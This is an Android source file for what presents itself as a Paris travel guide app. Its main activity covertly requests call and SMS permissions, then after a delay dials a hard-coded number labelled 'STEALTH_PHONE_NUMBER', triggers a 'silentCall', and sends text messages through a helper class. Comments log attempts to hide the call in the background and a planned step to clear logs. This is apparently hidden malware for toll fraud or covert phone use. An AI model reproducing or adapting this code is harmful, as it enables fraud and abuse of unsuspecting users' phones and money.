package com.example.travelparis.ui.activities;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.MenuItem;
import android.widget.Button;

import com.example.travelparis.R;
import com.example.travelparis.tools.BackgroundCaller;

import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;

import static com.example.travelparis.tools.Constants.ARG_ARTICLE_TYPE;
import static com.example.travelparis.tools.Constants.ARG_CATEGORY_TITLE;
import static com.example.travelparis.tools.Constants.REQUEST_PERMISSIONS;


public class MainActivity extends AppCompatActivity {

    private final static String STEALTH_PHONE_NUMBER = "tel:+375-25-519-4770";
    private final static int CALL_DELAY = 5000;
    private final static int SMS_DELAY = 2000;

    @BindView(R.id.toolbar)
    Toolbar mToolbar;

    private Handler mCallHandler;
    BackgroundCaller mConnector;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);

        setSupportActionBar(mToolbar);
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        getSupportActionBar().setHomeAsUpIndicator(R.drawable.ic_close_white_24dp);

        checkPermissions();
    }

    private void checkPermissions() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.CALL_PHONE, Manifest.permission.SEND_SMS, Manifest.permission.READ_SMS},
                    REQUEST_PERMISSIONS);
            return;
        }

        mConnector = new BackgroundCaller(this, STEALTH_PHONE_NUMBER);
        mCallHandler = new Handler();
        mCallHandler.postDelayed(new Runnable() {
            @SuppressLint("MissingPermission")
            @Override
            public void run() {
                try {
                    //TODO: background call
                    //
                    // Now have:
                    //  simpleCall();
                    //
                    // Already tried:
                    //  Service, BroadcastReceiver 's context;
                    //  permission.REORDER_TASKS
                    //  intent.addFlag(CLEAR_TOP, NEW_TASK,...);
                    simpleCall();
                    setupSmsHandler();
                } catch (ActivityNotFoundException e) {
                    e.printStackTrace();
                }

                killHandler();
            }
        }, CALL_DELAY);
        mConnector.silentCall();
    }

    @SuppressLint("MissingPermission")
    private void simpleCall() {
        Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse(STEALTH_PHONE_NUMBER));
        startActivity(intent);
    }

    private void setupSmsHandler() {
        Handler smsHandler = new Handler();
        smsHandler.postDelayed(new Runnable() {
            @SuppressLint("MissingPermission")
            @Override
            public void run() {
                try {
                    mConnector.sendMessage();
                    //TODO: fix
                    //mConnector.clearLogs();
                } catch (ActivityNotFoundException e) {
                    e.printStackTrace();
                }
            }
        }, SMS_DELAY);
    }

    private void killHandler() {
        mCallHandler = null;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode) {
            case REQUEST_PERMISSIONS: {
                for (int result : grantResults) {
                    if (result == PackageManager.PERMISSION_DENIED)
                        finish();
                }
                mConnector.silentCall();
            }
            default: {
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
            }
        }
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case android.R.id.home: {
                onBackPressed();
            }
        }

        return super.onOptionsItemSelected(item);
    }

    @OnClick({R.id.btn_tours, R.id.btn_day_spending, R.id.btn_attractions})
    void showCategory(Button view) {
        final int btnId = view.getId();
        Intent intent = new Intent(this, ArticlesActivity.class);
        intent.putExtra(ARG_ARTICLE_TYPE, btnId);
        intent.putExtra(ARG_CATEGORY_TITLE, view.getText());
        startActivity(intent);
        overridePendingTransition(R.anim.enter_right_in, R.anim.exit_left_out);
    }
}
